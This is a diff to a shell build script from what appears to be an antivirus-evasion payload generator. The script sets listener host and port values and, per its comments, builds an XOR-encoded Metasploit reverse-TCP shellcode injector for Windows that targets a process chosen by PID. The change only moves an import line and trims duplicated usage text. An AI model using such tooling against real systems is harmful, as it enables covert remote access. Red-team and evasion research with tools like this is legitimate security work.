@@ -16,6 +16,9 @@ cat banner.txt
 # or enter $win32_compiler="mycompiler" here
 . build/global_win32.sh
 
+# import feature construction interface
+. build/feature_construction.sh
+
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
@@ -33,9 +36,6 @@ generate_key preset aabbcc12de input/key_raw.txt
 enable_debug_print
 #CONFIGURATION_END
 
-
-# import feature construction interface
-. build/feature_construction.sh
 
 # generate metasploit payload that will later be injected into the target process
 # use reverse_tcp because the 32-bit test system appears to not handle https well
@@ -84,15 +84,5 @@ echo "
 #
 # The first and second command line parameters can be arbitrary strings, as they are not used. We hust need the third command line parameter.
 #
-# Use the third parameter to specify the PID of the process you want to inject your payload into."
-
-
-#USAGE_START
-# Usage example of generated output.exe:
-#
-# injectshc_targetfromcmd_fopen_gethostbyname_xor_revtcp_win32.exe first second 480
-#
-# The first and second command line parameters can be arbitrary strings, as they are not used. We hust need the third command line parameter.
-#
 # Use the third parameter to specify the PID of the process you want to inject your payload into.
-#USAGE_END
+"
